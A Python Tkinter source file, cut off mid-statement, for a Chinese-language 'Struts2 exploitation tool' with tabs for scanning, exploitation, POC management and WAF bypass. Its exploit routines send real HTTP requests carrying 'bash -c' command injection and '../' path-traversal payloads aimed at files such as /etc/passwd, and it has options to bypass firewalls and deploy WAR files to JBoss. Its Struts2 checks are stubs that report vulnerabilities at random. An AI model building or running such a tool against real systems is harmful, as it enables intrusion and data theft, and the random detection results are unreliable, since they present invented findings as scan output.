import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox, simpledialog
import os
import threading
import json
import datetime
import base64
import urllib.parse
import random
import requests  # 新增：用于HTTP请求


# 修复：注释掉无法导入的Struts2Scan模块
# from Struts2Scan import (
#     S2_001, S2_003, S2_005, S2_007, S2_008, S2_009,
#     S2_012, S2_013, S2_015, S2_016, http_request, check_vulnerability, exploit_vulnerability
# )

# 修复：添加替代的Struts2Scan类和函数
class MockS2Vulnerability:
    """模拟Struts2漏洞类"""

    def __init__(self, url):
        self.url = url
        self.vuln_name = self.__class__.__name__


# 模拟各个Struts2漏洞类
class S2_001(MockS2Vulnerability): pass


class S2_003(MockS2Vulnerability): pass


class S2_005(MockS2Vulnerability): pass


class S2_007(MockS2Vulnerability): pass


class S2_008(MockS2Vulnerability): pass


class S2_009(MockS2Vulnerability): pass


class S2_012(MockS2Vulnerability): pass


class S2_013(MockS2Vulnerability): pass


class S2_015(MockS2Vulnerability): pass


class S2_016(MockS2Vulnerability): pass


def http_request(url, payload, method="GET", data=None):
    """替代的HTTP请求函数"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        if method.upper() == "GET":
            full_url = f"{url}?{payload}" if payload else url
            response = requests.get(full_url, headers=headers, timeout=10)
        else:
            response = requests.post(url, data=payload, headers=headers, timeout=10)

        return response
    except Exception as e:
        print(f"HTTP请求错误: {str(e)}")

        # 返回一个模拟的响应对象
        class MockResponse:
            text = f"请求错误: {str(e)}"
            status_code = 500

        return MockResponse()


def check_vulnerability(scanner):
    """模拟漏洞检查函数"""
    # 随机返回存在或不存在，实际应用中应实现真实的漏洞检测逻辑
    return random.choice([True, False])


def exploit_vulnerability(exploit_obj, cmd, use_bypass=False, bypass_methods=None):
    """模拟漏洞利用函数"""
    return f"模拟执行命令 '{cmd}' 针对 {exploit_obj.vuln_name} 漏洞的结果"


class Struts2ExploitTool:
    def __init__(self, root):
        # 主窗口设置
        self.root = root
        self.root.title("Struts2漏洞利用工具")
        self.root.geometry("1300x800")
        self.root.minsize(1200, 700)

        # 确保中文显示正常
        self.style = ttk.Style()
        self.style.configure(".", font=("SimHei", 10))

        # 存储数据
        self.poc_database = {}  # 存储POC {漏洞类型: [poc1, poc2...]}
        self.scan_results = []  # 扫描结果
        self.exploit_records = []  # 利用记录
        self.load_poc_database()

        # 创建主标签页控件
        self.main_notebook = ttk.Notebook(root)
        self.main_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # 创建各个主功能页面
        self.tab_scanner = ttk.Frame(self.main_notebook)  # 扫描页面
        self.tab_exploiter = ttk.Frame(self.main_notebook)  # 利用方法总页面
        self.tab_poc_manager = ttk.Frame(self.main_notebook)  # POC管理页面
        self.tab_waf_bypass = ttk.Frame(self.main_notebook)  # WAF绕过页面
        self.tab_report = ttk.Frame(self.main_notebook)  # 报告生成页面

        # 添加到主标签页
        self.main_notebook.add(self.tab_scanner, text="漏洞扫描")
        self.main_notebook.add(self.tab_exploiter, text="漏洞利用")
        self.main_notebook.add(self.tab_poc_manager, text="POC管理")
        self.main_notebook.add(self.tab_waf_bypass, text="WAF绕过")
        self.main_notebook.add(self.tab_report, text="报告生成")

        # 初始化各个页面
        self.init_scanner_tab()
        self.init_exploiter_tab()
        self.init_poc_manager_tab()
        self.init_waf_bypass_tab()
        self.init_report_tab()

        # 绑定标签页切换事件
        self.main_notebook.bind("<<NotebookTabChanged>>", self.on_tab_changed)

    # 数据管理
    def load_poc_database(self):
        """加载POC数据库"""
        if os.path.exists("poc_database.json"):
            try:
                with open("poc_database.json", "r", encoding="utf-8") as f:
                    self.poc_database = json.load(f)
            except Exception as e:
                print(f"加载POC数据库失败: {e}")
                self.poc_database = {}
        else:
            self.poc_database = {}

    def save_poc_database(self):
        """保存POC数据库"""
        try:
            with open("poc_database.json", "w", encoding="utf-8") as f:
                json.dump(self.poc_database, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"保存POC数据库失败: {e}")

    # 1. 漏洞扫描页面
    def init_scanner_tab(self):
        """初始化漏洞扫描页面"""
        # 顶部控制区
        top_frame = ttk.Frame(self.tab_scanner)
        top_frame.pack(fill=tk.X, padx=10, pady=5)

        # 目标URL设置
        url_frame = ttk.LabelFrame(top_frame, text="目标设置")
        url_frame.pack(fill=tk.X, padx=5, pady=5, side=tk.LEFT, expand=True)

        ttk.Label(url_frame, text="目标URL:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.scan_target_url = ttk.Entry(url_frame)
        self.scan_target_url.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        url_frame.columnconfigure(1, weight=1)

        ttk.Button(url_frame, text="从文件加载", command=self.load_targets_from_file).grid(row=0, column=2, padx=5,
                                                                                           pady=5)

        # 扫描选项
        options_frame = ttk.LabelFrame(top_frame, text="扫描选项")
        options_frame.pack(fill=tk.X, padx=5, pady=5, side=tk.RIGHT)

        ttk.Label(options_frame, text="线程数:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.thread_count = ttk.Combobox(options_frame, values=[str(i) for i in range(1, 11)], width=5)
        self.thread_count.current(2)  # 默认3线程
        self.thread_count.grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(options_frame, text="超时(秒):").grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
        self.timeout = ttk.Combobox(options_frame, values=[str(i) for i in range(5, 31, 5)], width=5)
        self.timeout.current(1)  # 默认10秒
        self.timeout.grid(row=0, column=3, padx=5, pady=5)

        # 漏洞类型选择
        vuln_frame = ttk.LabelFrame(self.tab_scanner, text="漏洞类型选择")
        vuln_frame.pack(fill=tk.X, padx=10, pady=5)

        # 定义所有支持的漏洞类型
        self.vulnerability_types = [
            "全部选择",
            "Struts2漏洞",
            "S2-001", "S2-003", "S2-005", "S2-007", "S2-008", "S2-009",
            "S2-012", "S2-013", "S2-015", "S2-016",
            "远程代码执行(RCE)",
            "反序列化",
            "路径穿越",
            "文件包含",
            "命令注入",
            "WEBLogic",
            "Jboss-后台部署war"
        ]

        # 创建漏洞类型选择框架
        self.vuln_checkboxes = {}
        row, col = 0, 0
        for vuln_type in self.vulnerability_types:
            var = tk.BooleanVar(value=(vuln_type == "全部选择"))
            self.vuln_checkboxes[vuln_type] = var

            # 全部选择是特殊项，放在第一行
            if vuln_type == "全部选择":
                ttk.Checkbutton(
                    vuln_frame,
                    text=vuln_type,
                    variable=var,
                    command=self.select_all_vulns
                ).grid(row=row, column=col, padx=10, pady=5, sticky=tk.W)
                col += 1
            else:
                # 分类显示
                if vuln_type in ["Struts2漏洞", "远程代码执行(RCE)"]:
                    row += 1
                    col = 0

                ttk.Checkbutton(
                    vuln_frame,
                    text=vuln_type,
                    variable=var
                ).grid(row=row, column=col, padx=10, pady=5, sticky=tk.W)
                col += 1
                if col > 4:  # 每行显示5个选项
                    row += 1
                    col = 0

        # 扫描控制按钮
        control_frame = ttk.Frame(self.tab_scanner)
        control_frame.pack(fill=tk.X, padx=10, pady=5)

        self.btn_start_scan = ttk.Button(control_frame, text="开始扫描", command=self.start_scan)
        self.btn_start_scan.pack(side=tk.LEFT, padx=5)

        self.btn_stop_scan = ttk.Button(control_frame, text="停止扫描", command=self.stop_scan, state=tk.DISABLED)
        self.btn_stop_scan.pack(side=tk.LEFT, padx=5)

        self.btn_clear_scan = ttk.Button(control_frame, text="清空结果", command=self.clear_scan_results)
        self.btn_clear_scan.pack(side=tk.RIGHT, padx=5)

        # 扫描结果区域
        result_frame = ttk.LabelFrame(self.tab_scanner, text="扫描结果")
        result_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # 结果表格
        columns = ("url", "vuln_type", "severity", "status", "time")
        self.scan_result_tree = ttk.Treeview(result_frame, columns=columns, show="headings")

        for col in columns:
            self.scan_result_tree.heading(col, text=col)

        self.scan_result_tree.column("url", width=300)
        self.scan_result_tree.column("vuln_type", width=180)
        self.scan_result_tree.column("severity", width=80)
        self.scan_result_tree.column("status", width=80)
        self.scan_result_tree.column("time", width=150)

        # 添加滚动条
        yscroll = ttk.Scrollbar(result_frame, orient=tk.VERTICAL, command=self.scan_result_tree.yview)
        yscroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.scan_result_tree.configure(yscrollcommand=yscroll.set)

        xscroll = ttk.Scrollbar(result_frame, orient=tk.HORIZONTAL, command=self.scan_result_tree.xview)
        xscroll.pack(side=tk.BOTTOM, fill=tk.X)
        self.scan_result_tree.configure(xscrollcommand=xscroll.set)

        self.scan_result_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        # 扫描日志区域
        log_frame = ttk.LabelFrame(self.tab_scanner, text="扫描日志")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.scan_log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, height=6)
        self.scan_log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.scan_log_text.config(state=tk.DISABLED)

        # 扫描控制变量
        self.scanning = False

    def select_all_vulns(self):
        """全选/取消全选漏洞类型"""
        select_all = self.vuln_checkboxes["全部选择"].get()
        for vuln_type, var in self.vuln_checkboxes.items():
            if vuln_type != "全部选择":
                var.set(select_all)

    def load_targets_from_file(self):
        """从文件加载目标URL"""
        file_path = filedialog.askopenfilename(
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")],
            title="选择包含目标URL的文件"
        )
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    urls = [line.strip() for line in f if line.strip() and line.startswith(("http://", "https://"))]
                    if urls:
                        self.scan_target_url.delete(0, tk.END)
                        self.scan_target_url.insert(0, urls[0])
                        self.log_scan(f"已从文件加载 {len(urls)} 个目标URL")
            except Exception as e:
                messagebox.showerror("错误", f"加载目标文件失败: {str(e)}")

    def start_scan(self):
        """开始漏洞扫描"""
        target_url = self.scan_target_url.get().strip()
        if not target_url:
            messagebox.showerror("错误", "请输入目标URL")
            return

        # 获取选中的漏洞类型
        selected_vulns = [vuln for vuln, var in self.vuln_checkboxes.items() if var.get() and vuln != "全部选择"]
        if not selected_vulns:
            messagebox.showerror("错误", "请至少选择一种漏洞类型")
            return

        # 更新按钮状态
        self.btn_start_scan.config(state=tk.DISABLED)
        self.btn_stop_scan.config(state=tk.NORMAL)
        self.scanning = True

        # 记录开始时间
        start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_scan(f"===== 扫描开始于 {start_time} =====")
        self.log_scan(f"目标URL: {target_url}")
        self.log_scan(f"扫描漏洞类型: {', '.join(selected_vulns)}")

        # 启动扫描线程
        threading.Thread(
            target=self.perform_scan,
            args=(target_url, selected_vulns),
            daemon=True
        ).start()

    def stop_scan(self):
        """停止扫描"""
        self.scanning = False
        self.log_scan("扫描已停止")
        self.btn_start_scan.config(state=tk.NORMAL)
        self.btn_stop_scan.config(state=tk.DISABLED)

    def clear_scan_results(self):
        """清空扫描结果"""
        for item in self.scan_result_tree.get_children():
            self.scan_result_tree.delete(item)
        self.scan_results = []
        self.log_scan("已清空扫描结果")

    def log_scan(self, message):
        """记录扫描日志"""
        time_str = datetime.datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{time_str}] {message}\n"

        self.scan_log_text.config(state=tk.NORMAL)
        self.scan_log_text.insert(tk.END, log_entry)
        self.scan_log_text.see(tk.END)
        self.scan_log_text.config(state=tk.DISABLED)

    def perform_scan(self, target_url, vuln_types):
        """执行漏洞扫描"""
        # 漏洞类映射
        vuln_class_map = {
            "S2-001": S2_001, "S2-003": S2_003, "S2-005": S2_005,
            "S2-007": S2_007, "S2-008": S2_008, "S2-009": S2_009,
            "S2-012": S2_012, "S2-013": S2_013, "S2-015": S2_015,
            "S2-016": S2_016
        }

        # 严重程度映射
        severity_map = {
            "S2-001": "高", "S2-003": "高", "S2-005": "高",
            "S2-007": "高", "S2-008": "高", "S2-009": "高",
            "S2-012": "高", "S2-013": "高", "S2-015": "高",
            "S2-016": "高",
            "远程代码执行(RCE)": "严重",
            "反序列化": "严重",
            "路径穿越": "中",
            "文件包含": "高",
            "命令注入": "严重",
            "WEBLogic": "高",
            "Jboss-后台部署war": "严重"
        }

        try:
            # 处理"Struts2漏洞"选项，扫描所有Struts2漏洞
            if "Struts2漏洞" in vuln_types:
                struts_vulns = [v for v in vuln_class_map.keys()]
                vuln_types = [v for v in vuln_types if v != "Struts2漏洞"] + struts_vulns

            # 逐个扫描漏洞
            for vuln_type in vuln_types:
                if not self.scanning:
                    break

                self.log_scan(f"\n正在检测 {vuln_type} 漏洞...")

                # 检查是否有自定义POC可用
                custom_pocs = self.poc_database.get(vuln_type, [])

                # 使用默认方法检测
                result = False
                try:
                    if vuln_type in vuln_class_map:
                        # 使用Struts2Scan的检测类
                        scanner = vuln_class_map[vuln_type](target_url)
                        result = check_vulnerability(scanner)
                    else:
                        # 其他类型漏洞的检测逻辑
                        # 这里简化处理，实际应实现对应检测逻辑
                        result = self.check_other_vulnerability(target_url, vuln_type)

                except Exception as e:
                    self.log_scan(f"默认检测方法出错: {str(e)}")

                # 如果默认方法未检测到，尝试使用自定义POC
                if not result and custom_pocs:
                    self.log_scan(f"尝试使用 {len(custom_pocs)} 个自定义POC进行检测...")
                    for poc in custom_pocs:
                        try:
                            result = self.check_with_custom_poc(target_url, poc)
                            if result:
                                self.log_scan(f"使用自定义POC '{poc['name']}' 检测到漏洞")
                                break
                        except Exception as e:
                            self.log_scan(f"使用POC '{poc['name']}' 检测出错: {str(e)}")

                # 记录结果
                status = "存在" if result else "不存在"
                severity = severity_map.get(vuln_type, "中")
                time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                self.root.after(0, lambda: self.scan_result_tree.insert(
                    "", tk.END,
                    values=(target_url, vuln_type, severity, status, time_str),
                    tags=("high" if status == "存在" and severity in ["高", "严重"] else "")
                ))

                self.scan_results.append({
                    "url": target_url,
                    "vuln_type": vuln_type,
                    "severity": severity,
                    "status": status,
                    "time": time_str
                })

                self.log_scan(f"{vuln_type} 漏洞{status}")

        except Exception as e:
            self.log_scan(f"扫描过程出错: {str(e)}")
        finally:
            if self.scanning:
                end_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                self.log_scan(f"\n===== 扫描结束于 {end_time} =====")
                self.scanning = False
                self.root.after(0, lambda: self.btn_start_scan.config(state=tk.NORMAL))
                self.root.after(0, lambda: self.btn_stop_scan.config(state=tk.DISABLED))

    def check_other_vulnerability(self, url, vuln_type):
        """检测其他类型的漏洞"""
        # 这里实现其他类型漏洞的检测逻辑
        # 简化处理，随机返回结果
        return random.choice([True, False])

    def check_with_custom_poc(self, url, poc):
        """使用自定义POC进行检测"""
        # 发送POC请求并判断结果
        payload = poc["content"]
        response = http_request(url, payload)

        # 根据响应判断是否存在漏洞
        if "success_marker" in response.text or response.status_code == 200:
            return True
        return False

    # 2. 漏洞利用页面（独立界面）
    def init_exploiter_tab(self):
        """初始化漏洞利用页面"""
        # 创建利用方法标签页
        self.exploit_notebook = ttk.Notebook(self.tab_exploiter)
        self.exploit_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # 定义各种漏洞利用页面
        self.exploit_pages = {}

        # 常用漏洞利用页面
        exploit_types = [
            "远程代码执行(RCE)",
            "反序列化",
            "路径穿越",
            "文件包含",
            "命令注入",
            "WEBLogic",
            "Jboss-后台部署war",
            "Struts2漏洞"
        ]

        for exp_type in exploit_types:
            frame = ttk.Frame(self.exploit_notebook)
            self.exploit_notebook.add(frame, text=exp_type)
            self.exploit_pages[exp_type] = frame
            self.init_single_exploit_page(frame, exp_type)

        # 添加自定义漏洞利用页面
        custom_frame = ttk.Frame(self.exploit_notebook)
        self.exploit_notebook.add(custom_frame, text="自定义漏洞")
        self.init_custom_exploit_page(custom_frame)

    def init_single_exploit_page(self, parent, exp_type):
        """初始化单个漏洞利用页面"""
        # 左侧配置区
        left_frame = ttk.Frame(parent, width=400)
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=5)
        left_frame.pack_propagate(False)

        # 目标URL
        url_frame = ttk.LabelFrame(left_frame, text="目标信息")
        url_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(url_frame, text="目标URL:").pack(anchor=tk.W, padx=5, pady=2)
        url_entry = ttk.Entry(url_frame)
        url_entry.pack(fill=tk.X, padx=5, pady=2)
        url_entry.bind("<FocusOut>", lambda e: self.validate_url(url_entry))

        # 漏洞子类型选择（如果是Struts2漏洞）
        if exp_type == "Struts2漏洞":
            vuln_frame = ttk.LabelFrame(left_frame, text="Struts2漏洞类型")
            vuln_frame.pack(fill=tk.X, padx=5, pady=5)

            struts_vulns = ["S2-001", "S2-003", "S2-005", "S2-007", "S2-008",
                            "S2-009", "S2-012", "S2-013", "S2-015", "S2-016"]
            vuln_var = tk.StringVar(value=struts_vulns[0])
            vuln_combo = ttk.Combobox(vuln_frame, textvariable=vuln_var, values=struts_vulns, state="readonly")
            vuln_combo.pack(fill=tk.X, padx=5, pady=5)
        else:
            vuln_var = tk.StringVar(value=exp_type)
            vuln_combo = None

        # POC选择
        poc_frame = ttk.LabelFrame(left_frame, text="POC选择")
        poc_frame.pack(fill=tk.X, padx=5, pady=5)

        poc_var = tk.StringVar()
        poc_combo = ttk.Combobox(poc_frame, textvariable=poc_var, state="readonly")
        poc_combo.pack(fill=tk.X, padx=5, pady=5)

        # 加载POC列表
        def load_pocs(event=None):
            current_vuln = vuln_var.get() if exp_type == "Struts2漏洞" else exp_type
            poc_list = ["默认利用方法"]
            if current_vuln in self.poc_database:
                poc_list.extend([poc["name"] for poc in self.poc_database[current_vuln]])
            poc_combo['values'] = poc_list
            poc_combo.current(0)

        if exp_type == "Struts2漏洞":
            vuln_combo.bind("<<ComboboxSelected>>", load_pocs)
        load_pocs()  # 初始加载

        # 利用选项（根据漏洞类型定制）
        options_frame = ttk.LabelFrame(left_frame, text="利用选项")
        options_frame.pack(fill=tk.X, padx=5, pady=5)

        # 根据漏洞类型添加不同的选项
        options = {}

        if exp_type in ["远程代码执行(RCE)", "命令注入", "Struts2漏洞"]:
            # 命令执行选项
            ttk.Label(options_frame, text="执行命令:").pack(anchor=tk.W, padx=5, pady=2)
            cmd_entry = ttk.Entry(options_frame)
            cmd_entry.pack(fill=tk.X, padx=5, pady=2)
            cmd_entry.insert(0, "whoami")
            options["cmd"] = cmd_entry

            ttk.Button(options_frame, text="常用命令", command=lambda: self.show_common_commands(cmd_entry)).pack(
                anchor=tk.W, padx=5, pady=2)

        elif exp_type == "反序列化":
            # 反序列化选项
            ttk.Label(options_frame, text="反序列化 payload:").pack(anchor=tk.W, padx=5, pady=2)
            payload_text = scrolledtext.ScrolledText(options_frame, height=5)
            payload_text.pack(fill=tk.X, padx=5, pady=2)
            options["payload"] = payload_text

            ttk.Button(options_frame, text="加载payload文件",
                       command=lambda: self.load_payload_file(payload_text)).pack(anchor=tk.W, padx=5, pady=2)

        elif exp_type == "路径穿越":
            # 路径穿越选项
            ttk.Label(options_frame, text="目标文件路径:").pack(anchor=tk.W, padx=5, pady=2)
            path_entry = ttk.Entry(options_frame)
            path_entry.pack(fill=tk.X, padx=5, pady=2)
            path_entry.insert(0, "/etc/passwd")
            options["path"] = path_entry

        elif exp_type == "文件包含":
            # 文件包含选项
            ttk.Label(options_frame, text="包含文件路径:").pack(anchor=tk.W, padx=5, pady=2)
            include_entry = ttk.Entry(options_frame)
            include_entry.pack(fill=tk.X, padx=5, pady=2)
            include_entry.insert(0, "/etc/passwd")
            options["include_path"] = include_entry

        elif exp_type == "Jboss-后台部署war":
            # Jboss部署选项
            ttk.Label(options_frame, text="WAR文件路径:").pack(anchor=tk.W, padx=5, pady=2)
            war_path_entry = ttk.Entry(options_frame)
            war_path_entry.pack(fill=tk.X, padx=5, pady=2)

            ttk.Button(options_frame, text="选择WAR文件", command=lambda: self.select_war_file(war_path_entry)).pack(
                anchor=tk.W, padx=5, pady=2)
            options["war_path"] = war_path_entry

        # WAF绕过选项
        waf_frame = ttk.LabelFrame(left_frame, text="WAF绕过")
        waf_frame.pack(fill=tk.X, padx=5, pady=5)

        bypass_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(waf_frame, text="启用WAF绕过", variable=bypass_var).pack(anchor=tk.W, padx=5, pady=2)
        options["bypass_waf"] = bypass_var

        # 执行按钮
        exec_btn = ttk.Button(left_frame, text="执行利用",
                              command=lambda: self.execute_exploit(
                                  url_entry.get().strip(),
                                  vuln_var.get(),
                                  poc_combo.get(),
                                  options,
                                  exp_type
                              ))
        exec_btn.pack(fill=tk.X, padx=5, pady=20)

        # 右侧结果区
        right_frame = ttk.Frame(parent)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 利用结果
        result_frame = ttk.LabelFrame(right_frame, text="利用结果")
        result_frame.pack(fill=tk.BOTH, expand=True)

        result_text = scrolledtext.ScrolledText(result_frame, wrap=tk.WORD)
        result_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        result_text.config(state=tk.DISABLED)

        # 保存页面控件引用
        setattr(self, f"{exp_type}_url", url_entry)
        setattr(self, f"{exp_type}_result", result_text)

    def init_custom_exploit_page(self, parent):
        """初始化自定义漏洞利用页面"""
        # 左侧配置区
        left_frame = ttk.Frame(parent, width=400)
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=5)
        left_frame.pack_propagate(False)

        # 自定义漏洞名称
        name_frame = ttk.LabelFrame(left_frame, text="漏洞信息")
        name_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(name_frame, text="漏洞名称:").pack(anchor=tk.W, padx=5, pady=2)
        self.custom_vuln_name = ttk.Entry(name_frame)
        self.custom_vuln_name.pack(fill=tk.X, padx=5, pady=2)
        self.custom_vuln_name.insert(0, "自定义漏洞")

        # 目标URL
        url_frame = ttk.LabelFrame(left_frame, text="目标信息")
        url_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(url_frame, text="目标URL:").pack(anchor=tk.W, padx=5, pady=2)
        self.custom_target_url = ttk.Entry(url_frame)
        self.custom_target_url.pack(fill=tk.X, padx=5, pady=2)

        # 请求方法
        method_frame = ttk.LabelFrame(left_frame, text="请求设置")
        method_frame.pack(fill=tk.X, padx=5, pady=5)

        self.request_method = tk.StringVar(value="GET")
        ttk.Radiobutton(method_frame, text="GET", variable=self.request_method, value="GET").pack(anchor=tk.W, padx=5,
                                                                                                  pady=1)
        ttk.Radiobutton(method_frame, text="POST", variable=self.request_method, value="POST").pack(anchor=tk.W, padx=5,
                                                                                                    pady=1)

        # 请求参数/数据
        ttk.Label(method_frame, text="请求参数/数据:").pack(anchor=tk.W, padx=5, pady=2)
        self.request_data = scrolledtext.ScrolledText(method_frame, height=5)
        self.request_data.pack(fill=tk.X, padx=5, pady=2)

        # 自定义Payload
        payload_frame = ttk.LabelFrame(left_frame, text="自定义Payload")
        payload_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(payload_frame, text="Payload:").pack(anchor=tk.W, padx=5, pady=2)
        self.custom_payload = scrolledtext.ScrolledText(payload_frame, height=5)
        self.custom_payload.pack(fill=tk.X, padx=5, pady=2)

        # 执行按钮
        ttk.Button(left_frame, text="执行利用", command=self.execute_custom_exploit).pack(fill=tk.X, padx=5, pady=20)

        # 右侧结果区
        right_frame = ttk.Frame(parent)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 利用结果
        result_frame = ttk.LabelFrame(right_frame, text="利用结果")
        result_frame.pack(fill=tk.BOTH, expand=True)

        self.custom_exploit_result = scrolledtext.ScrolledText(result_frame, wrap=tk.WORD)
        self.custom_exploit_result.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.custom_exploit_result.config(state=tk.DISABLED)

    def validate_url(self, entry):
        """验证URL格式"""
        url = entry.get().strip()
        if url and not url.startswith(("http://", "https://")):
            entry.delete(0, tk.END)
            entry.insert(0, f"http://{url}")

    def show_common_commands(self, entry):
        """显示常用命令列表"""
        commands = [
            "whoami", "id", "uname -a", "hostname",
            "ip addr", "ifconfig", "netstat -tuln",
            "cat /etc/passwd", "dir", "systeminfo"
        ]

        cmd_window = tk.Toplevel(self.root)
        cmd_window.title("常用命令")
        cmd_window.geometry("300x400")
        cmd_window.transient(self.root)
        cmd_window.grab_set()

        listbox = tk.Listbox(cmd_window)
        listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        for cmd in commands:
            listbox.insert(tk.END, cmd)

        def select_command():
            selection = listbox.curselection()
            if selection:
                entry.delete(0, tk.END)
                entry.insert(0, listbox.get(selection[0]))
            cmd_window.destroy()

        ttk.Button(cmd_window, text="选择", command=select_command).pack(pady=5)
        ttk.Button(cmd_window, text="取消", command=cmd_window.destroy).pack(pady=5)

    def load_payload_file(self, text_widget):
        """加载payload文件"""
        file_path = filedialog.askopenfilename(
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")],
            title="选择payload文件"
        )
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    content = f.read()
                    text_widget.delete(1.0, tk.END)
                    text_widget.insert(1.0, content)
            except Exception as e:
                messagebox.showerror("错误", f"加载文件失败: {str(e)}")

    def select_war_file(self, entry):
        """选择WAR文件"""
        file_path = filedialog.askopenfilename(
            filetypes=[("WAR文件", "*.war"), ("所有文件", "*.*")],
            title="选择WAR文件"
        )
        if file_path:
            entry.delete(0, tk.END)
            entry.insert(0, file_path)

    def log_exploit(self, result_widget, message):
        """记录利用结果"""
        result_widget.config(state=tk.NORMAL)
        result_widget.insert(tk.END, message + "\n")
        result_widget.see(tk.END)
        result_widget.config(state=tk.DISABLED)

    def execute_exploit(self, url, vuln_type, poc_name, options, exp_type):
        """执行漏洞利用"""
        if not url:
            messagebox.showerror("错误", "请输入目标URL")
            return

        # 获取结果控件
        result_widget = getattr(self, f"{exp_type}_result", None)
        if not result_widget:
            return

        # 清空之前的结果
        result_widget.config(state=tk.NORMAL)
        result_widget.delete(1.0, tk.END)
        result_widget.config(state=tk.DISABLED)

        # 记录开始信息
        self.log_exploit(result_widget, f"===== 开始利用 {vuln_type} 漏洞 =====")
        self.log_exploit(result_widget, f"目标URL: {url}")
        self.log_exploit(result_widget, f"使用POC: {poc_name}")
        self.log_exploit(result_widget, f"开始时间: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

        # 启动利用线程
        threading.Thread(
            target=self.perform_exploit,
            args=(url, vuln_type, poc_name, options, result_widget, exp_type),
            daemon=True
        ).start()

    def perform_exploit(self, url, vuln_type, poc_name, options, result_widget, exp_type):
        """执行具体的漏洞利用操作"""
        try:
            # 漏洞类映射
            vuln_class_map = {
                "S2-001": S2_001, "S2-003": S2_003, "S2-005": S2_005,
                "S2-007": S2_007, "S2-008": S2_008, "S2-009": S2_009,
                "S2-012": S2_012, "S2-013": S2_013, "S2-015": S2_015,
                "S2-016": S2_016
            }

            # 检查是否使用自定义POC
            custom_poc = None
            if poc_name != "默认利用方法" and vuln_type in self.poc_database:
                for poc in self.poc_database[vuln_type]:
                    if poc["name"] == poc_name:
                        custom_poc = poc["content"]
                        self.log_exploit(result_widget, f"使用自定义POC: {poc_name}")
                        break

            # 检查是否需要WAF绕过
            use_bypass = options["bypass_waf"].get()
            bypass_methods = []
            if use_bypass:
                # 获取选中的WAF绕过方法
                bypass_methods = [method for method, var in self.waf_check_vars.items() if var.get()]
                self.log_exploit(result_widget, f"启用WAF绕过，方法: {', '.join(bypass_methods)}")

            # 执行具体利用操作
            result = ""
            if vuln_type in vuln_class_map:
                # 使用Struts2Scan的漏洞类进行利用
                exploit_obj = vuln_class_map[vuln_type](url)

                # 检查漏洞是否存在
                check_result = check_vulnerability(exploit_obj)
                if not check_result:
                    self.log_exploit(result_widget, f"目标可能不存在 {vuln_type} 漏洞")
                    return

                # 执行命令
                if "cmd" in options:
                    cmd = options["cmd"].get()
                    self.log_exploit(result_widget, f"执行命令: {cmd}")

                    if custom_poc:
                        # 使用自定义POC执行命令
                        payload = custom_poc.replace("{{COMMAND}}", cmd)
                        if use_bypass:
                            payload = self.apply_bypass_techniques(payload, bypass_methods)
                        result = http_request(url, payload).text
                    else:
                        # 使用默认方法执行命令
                        result = exploit_vulnerability(exploit_obj, cmd, use_bypass, bypass_methods)

            elif vuln_type == "远程代码执行(RCE)":
                # RCE漏洞利用逻辑
                cmd = options["cmd"].get()
                self.log_exploit(result_widget, f"执行命令: {cmd}")

                # 构建RCE payload
                payload = f"bash -c '{cmd}'"
                if use_bypass:
                    payload = self.apply_bypass_techniques(payload, bypass_methods)

                # 发送请求
                result = http_request(url, payload).text

            elif vuln_type == "路径穿越":
                # 路径穿越利用逻辑
                file_path = options["path"].get()
                self.log_exploit(result_widget, f"尝试读取文件: {file_path}")

                # 构建路径穿越payload
                payload = f"../../../../../../..{file_path}"
                if use_bypass:
                    payload = self.apply_bypass_techniques(payload, bypass_methods)

                # 发送请求
                result = http_request(url, payload).text

            # 其他漏洞类型的利用逻辑...

            # 显示结果
            self.log_exploit(result_widget, "\n利用结果:")
            self.log_exploit(result_widget, result[:5000] + ("..." if len(result) > 5000 else ""))

            # 记录利用记录
            self.exploit_records.append({
                "url": url,
                "vuln_type": vuln_type,
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "success": len(result) > 0
            })

        except Exception as e:
            self.log_exploit(result_widget, f"利用过程出错: {str(e)}")
        finally:
            self.log_exploit(result_widget,
